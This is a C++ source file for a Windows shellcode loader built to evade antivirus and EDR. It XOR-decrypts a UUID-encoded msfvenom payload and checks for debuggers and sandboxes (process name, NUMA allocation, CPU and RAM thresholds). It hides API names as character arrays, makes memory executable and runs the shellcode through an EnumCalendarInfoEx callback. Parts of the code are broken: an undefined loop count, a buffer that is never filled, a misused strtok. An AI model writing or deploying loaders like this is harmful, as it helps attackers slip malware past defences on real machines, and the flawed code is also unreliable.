#include <windows.h>

// ------------------
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <rpc.h>

// set your xor key( it should be similar to the one you used in the "xor_encryptor.py" )
#define XOR_KEY "CHANGEME"

#define EXE_NAME "lazarus.exe"

// each single UUID string( C-style string ) comprises:
// std uuid content( 36 characters ) + NULL terminator == 37
#define UUID_LINE_LEN 37

#define LOTS_OF_MEM 250'000'000

// the MAGICAL( but random ) byte
#define MAGIC_BYTE 0xf1

// Uncomment the line below if you're using Visual Studio for compiling.
// #pragma comment(lib, "Rpcrt4.lib")

BOOL(WINAPI *pMVP)(LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
LPVOID(WINAPI *pMVA)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

typedef LPVOID(WINAPI *pVirtualAllocExNuma)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType,
                                            DWORD flProtect, DWORD nndPreferred);

bool checkNUMA()
{
        LPVOID mem{NULL};
        const char k32DllName[13]{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0};
        const char vAllocExNuma[19]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l',
                                    'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', 0x0};
        pVirtualAllocExNuma myVirtualAllocExNuma =
            (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle(k32DllName), vAllocExNuma);
        mem =
            myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
        if (mem != NULL)
        {
                return false;
        }
        else
        {
                return true;
        }
}

bool checkResources()
{
        SYSTEM_INFO s{};
        MEMORYSTATUSEX ms{};
        DWORD procNum{};
        DWORD ram{};

        GetSystemInfo(&s);
        procNum = s.dwNumberOfProcessors;
        if (procNum < 2)
                return false;

        ms.dwLength = sizeof(ms);
        GlobalMemoryStatusEx(&ms);
        ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
        if (ram < 2)
                return false;

        return true;
}

void XOR(BYTE *data, unsigned long data_len, char *key, unsigned long key_len)
{
        for (unsigned long i{0x0}; i < data_len; ++i)
                data[i] ^= key[i % key_len];
}

int main(int argc, char *argv[])
{
        FreeConsole();

        // payload generation:
        // 1. msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
        // 2. python ./bin_to_uuid.py -p calc.bin -o calc.uuid
        // 3. python ./xor_encryptor.py calc.uuid > calc.xor
        BYTE payload[]{
            0x26, 0x7c, 0x79, 0x7d, 0x73, 0x7d, 0x2b, 0x26, 0x6e, 0x2d, 0x79, 0x28, 0x77, 0x68, 0x7d, 0x75, 0x20, 0x78,
            0x6c, 0x7e, 0x77, 0x75, 0x7d, 0x68, 0x77, 0x79, 0x74, 0x7f, 0x73, 0x74, 0x78, 0x75, 0x76, 0x7a, 0x74, 0x7f,
            0x4d, 0x21, 0x7f, 0x76, 0x72, 0x7c, 0x79, 0x7b, 0x71, 0x68, 0x79, 0x7d, 0x75, 0x7d, 0x6c, 0x7b, 0x75, 0x7d,
            0x2f, 0x68, 0x75, 0x78, 0x75, 0x76, 0x6a, 0x7d, 0x2f, 0x70, 0x71, 0x79, 0x79, 0x7a, 0x7f, 0x7d, 0x2f, 0x70,
            0x71, 0x42, 0x76, 0x7c, 0x7f, 0x27, 0x79, 0x7d, 0x71, 0x78, 0x6c, 0x7a, 0x7f, 0x70, 0x7d, 0x68, 0x21, 0x7f,
            0x71, 0x28, 0x6a, 0x71, 0x2c, 0x71, 0x22, 0x65, 0x75, 0x2a, 0x74, 0x74, 0x2e, 0x7c, 0x77, 0x70, 0x72, 0x7f,
            0x24, 0x75, 0x47, 0x72, 0x20, 0x7e, 0x70, 0x7d, 0x24, 0x24, 0x2e, 0x68, 0x71, 0x2b, 0x71, 0x7c, 0x6a, 0x71,
            0x7c, 0x77, 0x73, 0x65, 0x22, 0x7f, 0x24, 0x7c, 0x60, 0x75, 0x27, 0x7c, 0x70, 0x7e, 0x76, 0x26, 0x7c, 0x20,
            0x71, 0x2d, 0x25, 0x44, 0x73, 0x7d, 0x78, 0x74, 0x77, 0x79, 0x74, 0x7c, 0x6a, 0x70, 0x7f, 0x7d, 0x21, 0x65,
            0x79, 0x2c, 0x75, 0x75, 0x60, 0x71, 0x71, 0x7b, 0x22, 0x63, 0x73, 0x7d, 0x7d, 0x74, 0x27, 0x78, 0x79, 0x2c,
            0x7f, 0x75, 0x75, 0x7d, 0x49, 0x7c, 0x79, 0x7e, 0x77, 0x75, 0x7d, 0x75, 0x73, 0x65, 0x22, 0x7e, 0x7f, 0x70,
            0x60, 0x73, 0x74, 0x7f, 0x75, 0x63, 0x73, 0x7d, 0x7d, 0x74, 0x6e, 0x2c, 0x71, 0x7b, 0x77, 0x7d, 0x2f, 0x71,
            0x7b, 0x79, 0x79, 0x7a, 0x73, 0x4f, 0x79, 0x7c, 0x71, 0x78, 0x75, 0x7e, 0x7f, 0x27, 0x60, 0x21, 0x73, 0x78,
            0x70, 0x63, 0x72, 0x73, 0x28, 0x76, 0x6e, 0x7c, 0x79, 0x28, 0x21, 0x68, 0x2e, 0x7c, 0x77, 0x79, 0x79, 0x2c,
            0x74, 0x71, 0x75, 0x7d, 0x77, 0x70, 0x4b, 0x7d, 0x76, 0x71, 0x29, 0x21, 0x75, 0x78, 0x70, 0x63, 0x73, 0x7d,
            0x2e, 0x7c, 0x6e, 0x2b, 0x71, 0x7d, 0x76, 0x68, 0x2c, 0x26, 0x77, 0x79, 0x6c, 0x2d, 0x76, 0x26, 0x74, 0x75,
            0x27, 0x7c, 0x70, 0x7e, 0x76, 0x26, 0x7c, 0x4f, 0x25, 0x79, 0x76, 0x7b, 0x22, 0x75, 0x7e, 0x7d, 0x6e, 0x78,
            0x72, 0x7a, 0x24, 0x68, 0x7f, 0x71, 0x77, 0x2b, 0x6c, 0x7e, 0x7f, 0x71, 0x78, 0x68, 0x70, 0x71, 0x25, 0x7f,
            0x70, 0x70, 0x29, 0x7d, 0x76, 0x70, 0x75, 0x7a, 0x4d, 0x71, 0x74, 0x77, 0x77, 0x7c, 0x71, 0x76, 0x25, 0x68,
            0x29, 0x75, 0x73, 0x79, 0x6c, 0x7a, 0x76, 0x73, 0x7b, 0x68, 0x7b, 0x2a, 0x71, 0x2d, 0x6a, 0x71, 0x75, 0x71,
            0x77, 0x70, 0x23, 0x7a, 0x77, 0x74, 0x2e, 0x71, 0x7a, 0x42, 0x79, 0x2c, 0x73, 0x74, 0x29, 0x75, 0x73, 0x79,
            0x6c, 0x76, 0x7f, 0x75, 0x79, 0x68, 0x73, 0x79, 0x75, 0x76, 0x6a, 0x21, 0x7d, 0x71, 0x72, 0x65, 0x74, 0x76,
            0x73, 0x74, 0x78, 0x7d, 0x76, 0x2d, 0x74, 0x77, 0x72, 0x24, 0x47, 0x70, 0x7a, 0x7c, 0x70, 0x7b, 0x7f, 0x71,
            0x7c, 0x68, 0x76, 0x29, 0x75, 0x7f, 0x6a, 0x7d, 0x7e, 0x71, 0x7b, 0x65, 0x24, 0x2d, 0x75, 0x75, 0x60, 0x71,
            0x72, 0x7d, 0x73, 0x28, 0x21, 0x20, 0x7d, 0x70, 0x7b, 0x7c, 0x70, 0x44, 0x7f, 0x27, 0x79, 0x7d, 0x76, 0x29,
            0x74, 0x77, 0x6a, 0x20, 0x74, 0x74, 0x71, 0x65, 0x27, 0x28, 0x72, 0x72, 0x60, 0x23, 0x25, 0x2e, 0x27, 0x63,
            0x72, 0x21, 0x79, 0x7d, 0x21, 0x29, 0x71, 0x7f, 0x77, 0x75, 0x7d, 0x75, 0x49, 0x78, 0x71, 0x7e, 0x77, 0x75,
            0x7d, 0x75, 0x73, 0x65, 0x75, 0x76, 0x77, 0x75, 0x60, 0x7d, 0x27, 0x70, 0x25, 0x63, 0x77, 0x74, 0x7d, 0x74,
            0x6e, 0x78, 0x71, 0x7e, 0x77, 0x71, 0x7c, 0x27, 0x22, 0x7b, 0x70, 0x76, 0x25, 0x4f, 0x29, 0x70, 0x25, 0x2e,
            0x79, 0x79, 0x71, 0x23, 0x60, 0x23, 0x73, 0x2a, 0x23, 0x63, 0x26, 0x77, 0x2f, 0x70, 0x6e, 0x7d, 0x77, 0x7a,
            0x76, 0x68, 0x2f, 0x24, 0x22, 0x7e, 0x78, 0x7b, 0x25, 0x21, 0x74, 0x21, 0x25, 0x2e, 0x4b, 0x2d, 0x73, 0x7d,
            0x7e, 0x71, 0x7b, 0x2c, 0x74, 0x63, 0x74, 0x26, 0x7f, 0x7d, 0x6e, 0x7f, 0x22, 0x7e, 0x71, 0x68, 0x7d, 0x24,
            0x7b, 0x78, 0x6c, 0x28, 0x25, 0x20, 0x7d, 0x72, 0x76, 0x78, 0x74, 0x2c, 0x25, 0x71, 0x7a, 0x4f, 0x75, 0x29,
            0x77, 0x28, 0x70, 0x77, 0x7c, 0x76, 0x6e, 0x7d, 0x78, 0x7e, 0x77, 0x68, 0x75, 0x7c, 0x77, 0x79, 0x6c, 0x2a,
            0x26, 0x23, 0x2b, 0x68, 0x27, 0x7d, 0x77, 0x7d, 0x71, 0x74, 0x7b, 0x26, 0x75, 0x7b, 0x73, 0x2b, 0x4d, 0x75,
            0x7d, 0x73, 0x76, 0x7f, 0x79, 0x78, 0x72, 0x68, 0x74, 0x75, 0x7a, 0x78, 0x6c, 0x77, 0x77, 0x7c, 0x7d, 0x68,
            0x7a, 0x78, 0x78, 0x7e, 0x6a, 0x7c, 0x7d, 0x7c, 0x73, 0x71, 0x71, 0x77, 0x77, 0x7c, 0x7d, 0x7c, 0x73};

        char key[]{XOR_KEY};

        FreeConsole();

        if (strstr(argv[0], EXE_NAME) == NULL)
        {
                return -2;
        }

        if (IsDebuggerPresent())
        {
                return -2;
        }

        if (checkNUMA())
        {
                return -2;
        }

        if (checkResources() == false)
        {
                return -2;
        }

        const char virtProt[15] = {'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0x0};

        Sleep(7500); // you could use "ekko" by crack5pider for this, i'm still lazy for this

        const char k32DllName[13]{'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0x0};
        const char vAlloc[13]{'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0};

        BYTE *junk_mem{(BYTE *)malloc(LOTS_OF_MEM)};
        if (junk_mem)
        {
                memset(junk_mem, MAGIC_BYTE, LOTS_OF_MEM);
                free(junk_mem);

#if DEBUG
                printf("Before xor: %s\n\n", payload);
#endif

                // a NULL terminator can cause very SERIOUS bugs so 1st remove it from the key
                XOR(payload, sizeof(payload), key, (sizeof(key) - 1));

#if DEBUG
                printf("After xor: %s\n\n", payload);
#endif

                HMODULE k32_handle{GetModuleHandle(k32DllName)};
                BOOL rv{};
                char chars_array[39]{};
                DWORD oldprotect{0};
                char *temp{};
                printf("1 %s\n", payload);

                const char vAlloc[13]{ 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0x0 };
                pMVA = GetProcAddress(k32_handle, vAlloc);
                PVOID mem = pMVA(0, 0x100000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                DWORD_PTR hptr = (DWORD_PTR)mem;

                for (int i{0}; i < loops; i++)
                {
#if DEBUG
                        printf("Sub-string: %s\n\n", chars_array);
#endif

                        RPC_CSTR rcp_cstr = (RPC_CSTR)chars_array;
                        RPC_STATUS status = UuidFromStringA((RPC_CSTR)rcp_cstr, (UUID *)hptr);
                        if (status != RPC_S_OK)
                        {
                                fprintf(stderr, "[-] UUID conversion error: try to make sure your XOR keys match or "
                                                "correct the way you set up the payload.\n");
                                CloseHandle(mem);
                                return EXIT_FAILURE;
                        }

                        hptr += 16;
                        temp = strtok(NULL, "\n");
                }

                pMVP = GetProcAddress(k32_handle, virtProt);
                rv = pMVP(mem, 0x100000, PAGE_EXECUTE_READ, &oldprotect);
                if (!rv)
                {
                        fprintf(stderr, "[-] Failed to change the permissions for shellcode's memory\n");
                        return EXIT_FAILURE;
                }

                // attack! boom! we like planning events! :)
                EnumCalendarInfoEx((CALINFO_ENUMPROCEX)mem, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
                CloseHandle(mem);

                // should be ready for exfil! but successful code might never reach here! :(
#if DEBUG
                printf("[+] PWNED!!\n\t\tYOU'RE IN!\n");
#endif
                return 0;
        }
        else
        {
                return EXIT_FAILURE; // survived that AV/EDR. Phew!!
        }
}
